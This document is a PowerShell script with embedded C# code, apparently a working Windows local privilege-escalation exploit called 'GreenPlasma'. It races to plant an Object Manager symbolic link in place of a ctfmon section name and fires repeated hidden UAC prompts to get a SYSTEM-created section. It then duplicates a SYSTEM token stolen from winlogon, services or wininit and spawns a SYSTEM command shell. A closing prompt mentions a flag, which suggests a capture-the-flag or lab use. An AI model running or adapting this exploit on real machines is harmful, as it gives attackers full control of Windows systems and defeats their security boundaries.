param(
    [string]$Target = "",
    [string]$Command = "C:\Windows\System32\cmd.exe /k title SYSTEM SHELL && whoami && cd /d C:\",
    [int]$TimeoutSeconds = 0,
    [int]$TriggerEverySeconds = 6,
    [switch]$NoCleanup
)

$ErrorActionPreference = "Stop"

function Format-NtStatus {
    param([int]$Status)

    $u = [BitConverter]::ToUInt32(
        [BitConverter]::GetBytes([int32]$Status),
        0
    )

    return ("0x{0:X8}" -f $u)
}

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Restart-As64BitAdmin {
    if ([Environment]::Is64BitProcess) {
        return
    }

    $ps64 = "$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe"

    if (-not (Test-Path $ps64)) {
        throw "64-bit PowerShell not found at $ps64"
    }

    $args = @(
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", "`"$PSCommandPath`""
    )

    if ($Target) {
        $args += @("-Target", "`"$Target`"")
    }

    if ($Command) {
        $args += @("-Command", "`"$Command`"")
    }

    if ($TimeoutSeconds -gt 0) {
        $args += @("-TimeoutSeconds", "$TimeoutSeconds")
    }

    if ($TriggerEverySeconds -gt 0) {
        $args += @("-TriggerEverySeconds", "$TriggerEverySeconds")
    }

    if ($NoCleanup) {
        $args += "-NoCleanup"
    }

    Start-Process $ps64 -Verb RunAs -ArgumentList $args
    exit
}

Restart-As64BitAdmin

if (-not (Test-IsAdmin)) {
    throw "Run this from elevated 64-bit PowerShell."
}

$sessionId = [System.Diagnostics.Process]::GetCurrentProcess().SessionId

if ($sessionId -eq 0) {
    throw "Refusing to run from Session 0."
}

if ([string]::IsNullOrWhiteSpace($Target)) {
    $Target = "\Sessions\$sessionId\BaseNamedObjects\CTFMON_DEAD"
}

$Source = "\Sessions\$sessionId\BaseNamedObjects\CTF.AsmListCache.FMPWinlogon$sessionId"

Write-Host "[+] Session: $sessionId"
Write-Host "[+] Source:  $Source"
Write-Host "[+] Target:  $Target"

if (-not ("GreenPlasmaNativeAutoV5" -as [type])) {
$cs = @"
using System;
using System.Runtime.InteropServices;

public static class GreenPlasmaNativeAutoV5
{
    public const uint OBJ_CASE_INSENSITIVE = 0x40;
    public const uint GENERIC_ALL = 0x10000000;
    public const uint MAXIMUM_ALLOWED = 0x02000000;

    public const uint TH32CS_SNAPPROCESS = 0x00000002;
    public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;

    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
    public const uint TOKEN_ADJUST_SESSIONID = 0x0100;
    public const uint TOKEN_ALL_ACCESS = 0x000F01FF;

    public const int TokenUser = 1;
    public const int SecurityImpersonation = 2;
    public const int TokenPrimary = 1;
    public const int SE_PRIVILEGE_ENABLED = 0x2;
    public const int WinLocalSystemSid = 22;

    public const uint LOGON_WITH_PROFILE = 0x00000001;
    public const uint CREATE_NEW_CONSOLE = 0x00000010;

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public int PrivilegeCount;
        public LUID Luid;
        public int Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public int Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_USER
    {
        public SID_AND_ATTRIBUTES User;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    [DllImport("ntdll.dll")]
    public static extern int NtCreateSymbolicLinkObject(
        out IntPtr LinkHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref UNICODE_STRING DestinationName
    );

    [DllImport("ntdll.dll")]
    public static extern int NtOpenSection(
        out IntPtr SectionHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ProcessIdToSessionId(
        uint dwProcessId,
        out uint pSessionId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(
        uint dwFlags,
        uint th32ProcessID
    );

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool Process32FirstW(
        IntPtr hSnapshot,
        ref PROCESSENTRY32 lppe
    );

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool Process32NextW(
        IntPtr hSnapshot,
        ref PROCESSENTRY32 lppe
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LookupPrivilegeValueW(
        string lpSystemName,
        string lpName,
        out LUID lpLuid
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        int BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(
        IntPtr ExistingTokenHandle,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr DuplicateTokenHandle
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        int TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength,
        out int ReturnLength
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool IsWellKnownSid(
        IntPtr pSid,
        int WellKnownSidType
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        uint dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO si,
        out PROCESS_INFORMATION pi
    );

    private static IntPtr sourceBuf = IntPtr.Zero;
    private static IntPtr targetBuf = IntPtr.Zero;
    private static IntPtr objectNamePtr = IntPtr.Zero;
    private static UNICODE_STRING sourceUs;
    private static UNICODE_STRING targetUs;
    private static OBJECT_ATTRIBUTES oa;

    public static void InitObjectPaths(string source, string target)
    {
        sourceBuf = Marshal.StringToHGlobalUni(source);
        targetBuf = Marshal.StringToHGlobalUni(target);

        sourceUs = new UNICODE_STRING();
        sourceUs.Length = (ushort)(source.Length * 2);
        sourceUs.MaximumLength = (ushort)((source.Length + 1) * 2);
        sourceUs.Buffer = sourceBuf;

        targetUs = new UNICODE_STRING();
        targetUs.Length = (ushort)(target.Length * 2);
        targetUs.MaximumLength = (ushort)((target.Length + 1) * 2);
        targetUs.Buffer = targetBuf;

        objectNamePtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
        Marshal.StructureToPtr(sourceUs, objectNamePtr, false);

        oa = new OBJECT_ATTRIBUTES();
        oa.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
        oa.RootDirectory = IntPtr.Zero;
        oa.ObjectName = objectNamePtr;
        oa.Attributes = OBJ_CASE_INSENSITIVE;
        oa.SecurityDescriptor = IntPtr.Zero;
        oa.SecurityQualityOfService = IntPtr.Zero;
    }

    public static int CreateSymlink(out IntPtr hLink)
    {
        return NtCreateSymbolicLinkObject(out hLink, GENERIC_ALL, ref oa, ref targetUs);
    }

    public static int OpenSection(out IntPtr hSection)
    {
        return NtOpenSection(out hSection, MAXIMUM_ALLOWED, ref oa);
    }

    public static bool EnablePrivilege(string name)
    {
        IntPtr tok;

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tok))
            return false;

        LUID luid;

        if (!LookupPrivilegeValueW(null, name, out luid))
        {
            CloseHandle(tok);
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        bool ok = AdjustTokenPrivileges(
            tok,
            false,
            ref tp,
            Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)),
            IntPtr.Zero,
            IntPtr.Zero
        );

        int err = Marshal.GetLastWin32Error();

        CloseHandle(tok);

        Console.WriteLine("[*] EnablePrivilege({0}) ok={1} err={2}", name, ok, err);

        return ok && err == 0;
    }

    private static bool IsSystemToken(IntPtr token)
    {
        int len;
        GetTokenInformation(token, TokenUser, IntPtr.Zero, 0, out len);

        if (len <= 0)
            return false;

        IntPtr buf = Marshal.AllocHGlobal(len);

        try
        {
            if (!GetTokenInformation(token, TokenUser, buf, len, out len))
                return false;

            TOKEN_USER tu = (TOKEN_USER)Marshal.PtrToStructure(buf, typeof(TOKEN_USER));

            return IsWellKnownSid(tu.User.Sid, WinLocalSystemSid);
        }
        finally
        {
            Marshal.FreeHGlobal(buf);
        }
    }

    private static IntPtr OpenProc(uint pid)
    {
        IntPtr hp = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);

        if (hp == IntPtr.Zero)
            hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);

        return hp;
    }

    private static IntPtr TryDuplicateProcessToken(uint pid, string name, bool noisy)
    {
        IntPtr hp = OpenProc(pid);

        if (hp == IntPtr.Zero)
        {
            if (noisy)
                Console.WriteLine("[-] OpenProcess({0} {1}) failed err={2}", pid, name, Marshal.GetLastWin32Error());

            return IntPtr.Zero;
        }

        uint desired =
            TOKEN_DUPLICATE |
            TOKEN_QUERY |
            TOKEN_ASSIGN_PRIMARY;

        IntPtr tok;

        if (!OpenProcessToken(hp, desired, out tok))
        {
            if (noisy)
                Console.WriteLine("[-] OpenProcessToken({0} {1}) failed err={2}", pid, name, Marshal.GetLastWin32Error());

            CloseHandle(hp);
            return IntPtr.Zero;
        }

        if (!IsSystemToken(tok))
        {
            CloseHandle(tok);
            CloseHandle(hp);
            return IntPtr.Zero;
        }

        uint[] dupAccesses = new uint[] {
            TOKEN_ALL_ACCESS,
            MAXIMUM_ALLOWED,
            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID
        };

        foreach (uint access in dupAccesses)
        {
            IntPtr dup;

            if (DuplicateTokenEx(tok, access, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out dup))
            {
                Console.WriteLine("[+] Duplicated SYSTEM token from PID {0} ({1}) access=0x{2:X}", pid, name, access);
                CloseHandle(tok);
                CloseHandle(hp);
                return dup;
            }

            if (noisy)
                Console.WriteLine("[-] DuplicateTokenEx({0} {1}) access=0x{2:X} failed err={3}", pid, name, access, Marshal.GetLastWin32Error());
        }

        CloseHandle(tok);
        CloseHandle(hp);
        return IntPtr.Zero;
    }

    private static IntPtr WalkProcessesForToken(uint sessionId, bool preferredOnly)
    {
        IntPtr snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (snap == INVALID_HANDLE_VALUE)
        {
            Console.WriteLine("[-] CreateToolhelp32Snapshot failed err={0}", Marshal.GetLastWin32Error());
            return IntPtr.Zero;
        }

        PROCESSENTRY32 pe = new PROCESSENTRY32();
        pe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

        if (!Process32FirstW(snap, ref pe))
        {
            CloseHandle(snap);
            return IntPtr.Zero;
        }

        do
        {
            string name = pe.szExeFile == null ? "" : pe.szExeFile.ToLowerInvariant();

            bool preferred = false;
            bool noisy = false;

            if (name == "winlogon.exe")
            {
                uint sid;

                if (ProcessIdToSessionId(pe.th32ProcessID, out sid) && sid == sessionId)
                {
                    preferred = true;
                    noisy = true;
                }
            }

            if (name == "services.exe" || name == "wininit.exe")
            {
                preferred = true;
            }

            if (preferredOnly && !preferred)
                continue;

            if (!preferredOnly && preferred)
                continue;

            IntPtr dup = TryDuplicateProcessToken(pe.th32ProcessID, pe.szExeFile, noisy);

            if (dup != IntPtr.Zero)
            {
                CloseHandle(snap);
                return dup;
            }

        } while (Process32NextW(snap, ref pe));

        CloseHandle(snap);
        return IntPtr.Zero;
    }

    public static IntPtr StealSystemToken(uint sessionId)
    {
        EnablePrivilege("SeDebugPrivilege");
        EnablePrivilege("SeImpersonatePrivilege");
        EnablePrivilege("SeAssignPrimaryTokenPrivilege");
        EnablePrivilege("SeIncreaseQuotaPrivilege");

        Console.WriteLine("[*] Trying preferred SYSTEM processes first...");
        IntPtr tok = WalkProcessesForToken(sessionId, true);

        if (tok != IntPtr.Zero)
            return tok;

        Console.WriteLine("[*] Preferred token sources failed; scanning all SYSTEM tokens...");
        return WalkProcessesForToken(sessionId, false);
    }

    public static bool SpawnWithToken(IntPtr token, string command)
    {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
        si.lpDesktop = "WinSta0\\Default";

        PROCESS_INFORMATION pi;

        bool ok = CreateProcessWithTokenW(
            token,
            LOGON_WITH_PROFILE,
            null,
            command,
            CREATE_NEW_CONSOLE,
            IntPtr.Zero,
            "C:\\",
            ref si,
            out pi
        );

        if (ok)
        {
            Console.WriteLine("[+] SYSTEM process spawned, PID {0}", pi.dwProcessId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        else
        {
            Console.WriteLine("[-] CreateProcessWithTokenW failed. LastError={0}", Marshal.GetLastWin32Error());
        }

        return ok;
    }
}
"@

    Add-Type -TypeDefinition $cs -Language CSharp
}

function Stop-StaleProcesses {
    param([int]$SessionId)

    $names = @("GreenPlasma", "GreenPlasma2", "GreenPlasma-Auto")

    foreach ($name in $names) {
        Get-Process -Name $name -ErrorAction SilentlyContinue |
            Where-Object { $_.Id -ne $PID } |
            ForEach-Object {
                Write-Host "[*] Killing stale $($_.ProcessName) PID $($_.Id)"
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            }
    }

    Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue |
        Where-Object { $_.SessionId -eq $SessionId } |
        ForEach-Object {
            Write-Host "[*] Killing ctfmon.exe PID $($_.Id) in session $SessionId"
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
        }

    Get-CimInstance Win32_Process |
        Where-Object {
            $_.ProcessId -ne $PID -and
            $_.Name -match "powershell|pwsh" -and
            $_.CommandLine -match "GreenPlasma"
        } |
        ForEach-Object {
            Write-Host "[*] Killing stale PowerShell GreenPlasma PID $($_.ProcessId)"
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        }
}

function Arm-GreenPlasmaSymlink {
    param(
        [int]$SessionId,
        [string]$Source,
        [string]$Target,
        [int]$Attempts = 100
    )

    [GreenPlasmaNativeAutoV5]::InitObjectPaths($Source, $Target)

    for ($i = 1; $i -le $Attempts; $i++) {
        if (-not $NoCleanup) {
            Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue |
                Where-Object { $_.SessionId -eq $SessionId } |
                ForEach-Object {
                    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                }
        }

        Start-Sleep -Milliseconds 35

        $h = [IntPtr]::Zero
        $s = [GreenPlasmaNativeAutoV5]::CreateSymlink([ref]$h)

        if ($s -ge 0 -and $h -ne [IntPtr]::Zero) {
            Write-Host "[+] Symlink armed on attempt $i"
            return @{
                Handle = $h
                Status = $s
            }
        }

        $hex = Format-NtStatus $s

        if ($hex -ne "0xC0000035") {
            Write-Host "[-] NtCreateSymbolicLinkObject failed: $hex"
            break
        }

        if (($i % 10) -eq 0) {
            Write-Host "[*] Still racing source object collision... attempt $i/$Attempts"
        }
    }

    throw "Could not arm Object Manager symlink. Close old GreenPlasma/PowerShell windows or log off/on."
}

function Invoke-AutomaticUacTrigger {
    Write-Host "[*] Triggering UAC from medium-integrity Explorer..."

    Get-ChildItem $env:TEMP -Directory -Filter "greenplasma-uac-*" -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -lt (Get-Date).AddMinutes(-5) } |
        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

    $dir = Join-Path $env:TEMP ("greenplasma-uac-" + [guid]::NewGuid().ToString())
    New-Item -ItemType Directory -Force -Path $dir | Out-Null

    $triggerPs1 = Join-Path $dir "trigger.ps1"
    $shortcut = Join-Path $dir "trigger.lnk"

    $triggerBody = @'
$ErrorActionPreference = "SilentlyContinue"
$cmd = "$env:windir\System32\cmd.exe"
Start-Process -FilePath $cmd -ArgumentList "/k title UAC_TRIGGER && whoami" -Verb RunAs
'@

    Set-Content -Path $triggerPs1 -Value $triggerBody -Encoding ASCII

    $ps = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"

    $wsh = New-Object -ComObject WScript.Shell
    $lnk = $wsh.CreateShortcut($shortcut)
    $lnk.TargetPath = $ps
    $lnk.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$triggerPs1`""
    $lnk.WorkingDirectory = "$env:windir\System32"
    $lnk.WindowStyle = 7
    $lnk.Save()

    Start-Process -FilePath explorer.exe -ArgumentList "`"$shortcut`"" -WindowStyle Hidden | Out-Null

    Start-Sleep -Milliseconds 750
}

if (-not $NoCleanup) {
    Stop-StaleProcesses -SessionId $sessionId
    Start-Sleep -Milliseconds 500
}

$armed = Arm-GreenPlasmaSymlink -SessionId $sessionId -Source $Source -Target $Target
$hLink = $armed.Handle
$status = $armed.Status

Write-Host "[+] Object Manager symlink armed"
Write-Host "[+] $Source -> $Target"
Write-Host "[+] Waiting for SYSTEM-created section"
Write-Host "[+] UAC will be triggered automatically. Approve the prompt."

$hSection = [IntPtr]::Zero
$lastStatusHex = ""
$lastTrigger = [DateTime]::MinValue
$start = Get-Date
$tick = 0

while ($true) {
    $now = Get-Date

    if (($now - $lastTrigger).TotalSeconds -ge $TriggerEverySeconds) {
        Invoke-AutomaticUacTrigger
        $lastTrigger = Get-Date
    }

    $status = [GreenPlasmaNativeAutoV5]::OpenSection([ref]$hSection)

    if ($hSection -ne [IntPtr]::Zero) {
        break
    }

    $hex = Format-NtStatus $status

    if ($hex -ne $lastStatusHex) {
        Write-Host "[*] NtOpenSection: $hex"
        $lastStatusHex = $hex
    }

    $tick++

    if (($tick % 25) -eq 0) {
        Write-Host -NoNewline "."
    }

    if ($TimeoutSeconds -gt 0 -and (($now - $start).TotalSeconds -ge $TimeoutSeconds)) {
        [GreenPlasmaNativeAutoV5]::CloseHandle($hLink) | Out-Null
        throw "Timed out waiting for section."
    }

    Start-Sleep -Milliseconds 100
}

Write-Host ""
Write-Host ("[+] Section handle: 0x{0:X}" -f $hSection.ToInt64())
Write-Host "[*] Attempting SYSTEM token duplication..."

$hTok = [GreenPlasmaNativeAutoV5]::StealSystemToken([uint32]$sessionId)

if ($hTok -eq [IntPtr]::Zero) {
    Write-Warning "Could not duplicate a SYSTEM token."
    Write-Host "[!] The section primitive worked, but token duplication failed."
    Write-Host "[!] Run the original compiled EXE if this PowerShell path still fails on token duplication."
}
else {
    [GreenPlasmaNativeAutoV5]::SpawnWithToken($hTok, $Command) | Out-Null
    [GreenPlasmaNativeAutoV5]::CloseHandle($hTok) | Out-Null
}

Write-Host ""
Write-Host "[+] Holding link and section handles open."
Write-Host "[+] Press Enter only after you have the SYSTEM shell / flag."
Read-Host | Out-Null

[GreenPlasmaNativeAutoV5]::CloseHandle($hSection) | Out-Null
[GreenPlasmaNativeAutoV5]::CloseHandle($hLink) | Out-Null